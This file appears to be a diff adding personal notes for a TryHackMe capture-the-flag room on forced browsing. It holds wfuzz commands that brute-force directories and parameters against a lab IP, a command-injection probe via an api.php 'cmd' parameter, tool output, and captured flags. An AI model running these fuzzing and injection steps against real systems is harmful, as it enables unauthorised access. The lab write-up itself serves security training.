@@ -1,0 +1,41 @@
+Task 7 [Section 2 - Forced Browsing]: Automatic Exploitation 
+
+pip3 install wfuzz
+
+What flag hides characters
+--hh
+
+What flag shows specific word amounts instead of hides them
+--sw
+
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 57 10.10.189.10:81/FUZZ/note.txt
+Target: http://10.10.189.10:81/FUZZ/note.txt
+Total requests: 20469
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000013500:   200        1 L      1 W        20 Ch       "password"  
+
+http://10.10.189.10:81/password/note.txt
+
+flag{forcednooting}
+
+http://10.10.189.10:82/admin.php
+command ---> id
+http://10.10.189.10:82/api.php?cmd=id
+
+
+wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hw 0 10.10.189.10:82/api.php?FUZZ=flag.txt
+
+http://10.10.189.10:82/api.php?file=flag.txt
+
+
+flag{test1234}
+
+
+https://www.thedutchhacker.com/zth-web-2/
+https://medium.com/@g30rg3sai/zth-web-2-tryhackme-walkthrough-fa8e671454bf
+
+https://tryhackme.com/room/zthweb2
